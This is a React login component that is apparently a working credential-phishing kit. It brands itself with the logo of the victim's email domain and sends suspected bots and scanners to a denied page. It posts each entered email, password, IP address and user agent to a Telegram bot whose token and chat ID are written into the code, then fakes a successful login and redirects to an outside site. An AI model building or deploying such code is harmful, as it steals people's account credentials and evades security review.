import React, { useState } from 'react';
import axios from 'axios';
import md5 from 'md5'; // Import the md5 hashing library
import styles from '../styles/Index.module.css';


const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailEntered, setEmailEntered] = useState(false);
  const [logo, setLogo] = useState('/favicon.ico'); // Default placeholder logo
  const [instruction, setInstruction] = useState('Verify your email identity to continue.');

  // Generate Gravatar URL
  const getGravatarUrl = (email) => {
    const hash = md5(email.trim().toLowerCase());
    return `https://www.gravatar.com/avatar/${hash}?d=identicon`; // Default to 'identicon' if no Gravatar is found
  };

  // Handle email input changes
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  // Handle email form submission
  const handleEmailSubmit = (e) => {
    e.preventDefault();

    // Validate email format
    if (email.includes('@')) {
      setEmailEntered(true);
      setInstruction('Verify email password');

      // Extract domain from email and update logo
      const domain = email.split('@')[1];
      if (domain) {
        setLogo(`https://logo.clearbit.com/${domain}`);
      } else {
        setLogo('/favicon.ico'); // Default logo
      }
    } else {
      alert('Please enter a valid email address.');
    }
  };

  // Handle password form submission
  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    // Validate password length
    if (password.length < 5) {
      alert('Password must be at least 5 characters long.');
      return;
    }

    try {
      // Get user's public IP address
      const userIP = await axios
        .get('https://api64.ipify.org?format=json')
        .then((res) => res.data.ip);

      // Call the hosted Vercel API for bot detection
      const response = await axios.post('https://rail-bot-production.up.railway.app/api/detect_bot', {
        user_agent: navigator.userAgent,
        ip: userIP,
      });

      const { is_bot, country, details } = response.data;

      if (is_bot) {
        // Redirect flagged bots to the denied page
        console.warn('Bot detected:', details);
        window.location.href = '/denied';
        return;
      }

      // If the user passes bot detection, send login details to Telegram
      const TELEGRAM_BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
      const TELEGRAM_CHAT_ID = '-1002493880170';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🌍 <b>IP Address:</b> ${userIP}
🏳️ <b>Country:</b> ${country}
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      `;

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: loginAlert,
        parse_mode: 'HTML',
      });

      // Simulate successful login and redirect
      alert('Login successful!');
      window.location.href = 'https://googlebite.com'; // Redirect after login
    } catch (error) {
      console.error('Error during API call:', error);
      alert('An error occurred. Please try again later.');
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img src={logo} alt="Dynamic Logo" className="logo" />
        <p className="instruction">{instruction}</p>
        {!emailEntered ? (
          <form onSubmit={handleEmailSubmit}>
            <input
              type="email"
              placeholder="Enter recipient email"
              value={email}
              onChange={handleEmailChange}
              required
            />
            <button type="submit">Next</button>
          </form>
        ) : (
          <>
            <p className="entered-email">
              <img src={getGravatarUrl(email)} alt="Profile Icon" className="profile-icon" />
              {email}
            </p>
            <form onSubmit={handlePasswordSubmit}>
              <input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                minLength="5"
              />
              <button type="submit">Login</button>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default Login;
